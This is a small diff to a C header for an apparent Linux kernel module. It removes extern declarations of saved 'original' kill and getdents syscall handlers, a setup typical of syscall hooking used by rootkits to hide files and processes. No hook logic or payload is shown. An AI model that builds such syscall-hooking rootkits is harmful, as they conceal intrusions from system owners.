@@ -17,8 +17,4 @@ struct linux_dirent {
 
 typedef asmlinkage long (*syscall_t)(const struct pt_regs *);
 
-extern syscall_t original_kill;
-extern syscall_t original_getdents;
-extern syscall_t original_getdents64;
-
 #endif // OSCW_DEF_H_
